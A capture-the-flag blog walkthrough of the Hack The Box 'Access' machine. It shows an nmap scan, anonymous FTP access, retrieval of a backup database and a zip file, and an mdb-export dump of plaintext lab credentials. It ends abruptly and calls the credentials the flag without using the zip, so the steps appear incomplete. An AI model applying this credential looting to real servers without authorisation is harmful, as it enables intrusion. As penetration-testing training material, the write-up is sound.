<!DOCTYPE html>
<html lang="en"><meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css"
		integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css"
	  integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
	<link rel="stylesheet" href="https://cdn.rawgit.com/jpswalsh/academicons/master/css/academicons.min.css"
	  crossorigin="anonymous">
	<link rel="stylesheet" href="/css/simple.css">

	<head>
		<link rel="stylesheet" href="/font-awesome-4.7.0/css/font-awesome.min.css">

		<title>Access | Swapnil Pathak</title>
	</head>

	<!-- Start body -->
	<body>
    <div class="container-responsive fixed-top border-bottom" style="background-color: #fff;">
			<div class="container">
      	<nav class="navbar navbar-expand-lg navbar-light px-0">
          <div class="col-sm-3 text-center px-0">
            <a class="navbar-brand font-weight-bold" href="/about/">About</a>
          </div>

          <div class="col-sm-8 ml-auto px-0">

            <ul class="navbar-nav">
              <li class="nav-item dropdown">
                <a class="navbar-toggler dropdown-toggle" href="/" id="navbardrop" data-toggle="dropdown">Menu</a>
                <div class="dropdown-menu">
                  <a class="dropdown-item" href="/">Home</a>
                  <a class="dropdown-item" href="/about/">About</a>
                  <a class="dropdown-item" href="/security_blog/">Security Blog</a>
                </div>
              </li>
            </ul>

          	<div id="navbar-content" class="collapse navbar-collapse">
              <ul class="navbar-nav ml-auto">
                <li class="nav-item active">
                  <a class="nav-link text-uppercase font-weight-bold" href="/" title=Home>Home</a>
                </li>
                <li class="nav-item active">
                  <a class="nav-link text-uppercase font-weight-bold" href="/security_blog/" title="Security Blog">Security Blog</a>
                </li>
              </ul>
            </div>
          </div>
        </nav>
      </div>
    </div>
		<!-- End header -->

		<!-- Main content start -->
    <div class="container mt-5 pt-5">
      <main class="col-sm-10 mx-sm-auto">

      	<article class="post">
          <header>
            <h1>Access</h1>
            <span class="text-muted">Windows machine from HTB!</span><br>
            <span class="text-muted">

            	Posted <time datetime=2019-03-11&#32;EDT>Mon Mar 11 2019</time>

            </span>
            <br>
						<a href="/tags/machines"><span class="badge badge-primary">machine</span></a>
						<a href="/tags/machines/easy.html"><span class="badge badge-primary">easy</span></a>

          </header>
          <hr>
          <section class="body">
            <p>This was my first ever machine on HTB. Took me around 3 days to figure this out (I was just starting!). This box touches basic misconfiguration in Windows based servers and is a good starter to your adventure in penetration testing with hackthebox.
            </p>

            <figure class="post">
          	<img src="/assets/HTB_images/machines/Access/banner.PNG" class="img-responsive img-rounded">

      			</figure>

      			<h2 id="access">Unlock and Access!</h2>

      			<p>Before following this walkthrough, I highly recommend trying to get the flag yourself! Just like you will hear from everyone else, try harder! (if you cannot find it)</p>
            <p>First up, we'll scan the box using basic nmap scripts and then go from there (Enumerate!).</p>
            <div class="highlight">
              <pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
                <code class="language-bash" data-lang="bash"><span style="color:#66d9ef">
htb@noone:~/Access$</span> nmap -v -p- -sC -sV -oA nmap/access 10.10.10.98
Nmap scan report for 10.10.10.98
Host is up (0.12s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</code>
              </pre>
            </div>
						<p>Well, so we have a few ports open, port 21, 23, 80.</p>
						<p>I always like to check the low-hanging fruit first. So let's get into FTP since <code>anonymous</code> login is allowed. This is a common misconfiguration for FTP logins. You never know what you might find but always is useful.</p>
						<div class="highlight">
              <pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
                <code class="language-bash" data-lang="bash"><span style="color:#66d9ef">
htb@noone:~/Access$</span> ftp 10.10.10.98
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:htb): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  08:16PM       &lt;DIR&gt;          Backups
08-24-18  09:00PM       &lt;DIR&gt;          Engineer
226 Transfer complete.
ftp> cd Backups
250 CWD command successful.
ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection.
08-23-18  08:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> cd ../Engineer
l250 CWD command successful.
ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection.
08-24-18  12:16AM                10870 Access Control.zip
226 Transfer complete.
ftp> get "Access Control.zip"
ftp> get ../Backups/backup.mdb</code>
							</pre>
						</div>
            <p>After exploring the FTP shell, I found two files <code>backup.mdb</code> and <code>Access Control.zip</code></p>
						<div class="highlight">
							<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
								<code class="language-bash" data-lang="bash"><span style="color:#66d9ef">
htb@noone:~/Access$</span> mdb-tables backup.mdb
acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission <span style="color:#ff0000">auth_user</span> auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx
<span style="color:#66d9ef">
htb@noone:~/Access$</span> mdb-export backup.mdb auth_user
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,<span style="color:#ff0000">"engineer"</span>,<span style="color:#ff0000">"access4u@security"</span>,1,"08/23/18 21:13:36",26,
28,<span style="color:#ff0000">"backup_admin"</span>,<span style="color:#ff0000">"admin"</span>,1,"08/23/18 21:14:02",26,</code>
							</pre>
						</div>


			      <p>Voila! We have the FLAG and we can use this to gain out points on HackTheBox. Don't forget to enclose the flag in <i>HTB{}</i> because that's the format.</p>
			      <p>Happy Hacking! Cheers!</p>
					</section>
				</article>
			</main>
		</div>
		<!-- End main content -->

		<hr>

		<p class="text-center text-muted">
			&copy; SSP
		</p>
		<!-- End footer -->

	<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
		integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"
		crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"
		integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49"
		crossorigin="anonymous"></script>
	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"
		integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy"
		crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"
		integrity="sha256-nvJJv9wWKEm88qvoQl9ekL2J+k/RWIsaSScxxlsrv8k="
		crossorigin="anonymous"></script>
	<script type="application/javascript">
		var doNotTrack = false;
		if (!doNotTrack) {
		window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
		ga('create', 'UA-6650910-4', 'auto');
		ga('send', 'pageview');
		}
	</script>
	<script async src='https://www.google-analytics.com/analytics.js'></script>

	</body>
</html>
